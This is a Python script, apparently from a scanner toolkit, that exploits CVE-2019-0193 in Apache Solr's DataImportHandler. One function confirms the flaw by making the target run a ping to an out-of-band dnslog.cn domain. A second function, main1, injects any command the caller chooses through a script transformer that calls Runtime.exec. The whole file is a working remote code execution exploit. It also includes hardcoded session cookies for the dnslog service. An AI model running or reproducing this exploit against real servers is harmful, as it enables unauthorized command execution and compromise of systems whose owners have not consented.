import requests
import json
import time


HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "en-US,en;q=0.5",
    "connection": "close",
    "user-agent": "mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",
}

DNS_HEADERS = {
"Accept": "*/*",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "zh-CN,zh;q=0.9",
"Connection": "keep-alive",
"Cookie": "UM_distinctid=1761c48a9aa8a0-0d283f9a0e01d-51402e1a-100200-1761c48a9ab7a2; PHPSESSID=b0vo952deup7ho6n6e482ddm37;, CNZZDATA1278305074=262987125-1606789220-%7C1608977604",
"Host": "www.dnslog.cn",
"Referer": "http://www.dnslog.cn/",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
}

def Get_core(ip):
    try:
        url = ip + "/solr/admin/cores?indexInfo=false&wt=json"
        r = requests.get(url, timeout=25, headers=HEADERS, verify=False)
        core_name = list(json.loads(r.text)["status"])[0]
    except:
        return "core获取失败"
    return core_name



def Get_dnslog():
    url = "http://www.dnslog.cn/getdomain.php?t=0.5081695881484336"
    r = requests.get(url, headers=DNS_HEADERS, timeout=25)
    return r.text



def main(ip):
    try:
        core = Get_core(ip)
    except:
        return "缺少core值"
    dnslog = Get_dnslog()
    cmd = "ping " + dnslog
    debug_model_url = ip + '/solr/'+ core +'/dataimport?_=1565530241159&indent=on&wt=json'
    payload = "command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22{}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport".format(cmd)

    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding":"gzip, deflate",
    "Content-type":"application/x-www-form-urlencoded",
    "X-Requested-With":"XMLHttpRequest",
    "Referer":"http://%s/solr/" % ip
    }
    r = requests.post(debug_model_url, data=payload, headers=headers, verify=False, timeout=25)
    # print(r.text)
    url = "http://www.dnslog.cn/getrecords.php?t=0.5081695881484336"
    time.sleep(2)
    r1 = requests.get(url, headers=DNS_HEADERS, verify=False, timeout=25)
    if "dnslog.cn" in r1.text:
        return "存在漏洞CVE-2019-0193，请及时修复! 无回显但可直接利用"
    else:
        return "不存在漏洞CVE-2019-0193"


def main1(ip,cmd):
    try:
        core = Get_core(ip)
    except:
        return "缺少core值"
    debug_model_url = ip + '/solr/'+ core +'/dataimport?_=1565530241159&indent=on&wt=json'
    payload = "command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22{}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport".format(cmd)

    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding":"gzip, deflate",
    "Content-type":"application/x-www-form-urlencoded",
    "X-Requested-With":"XMLHttpRequest",
    "Referer":"http://%s/solr/" % ip
    }
    r = requests.post(debug_model_url, data=payload, headers=headers, verify=False, timeout=25)
    return "存在漏洞CVE-2019-0193，无回显但可直接利用"


# if __name__ == '__main__':
#     main("http://192.168.0.109:8983")

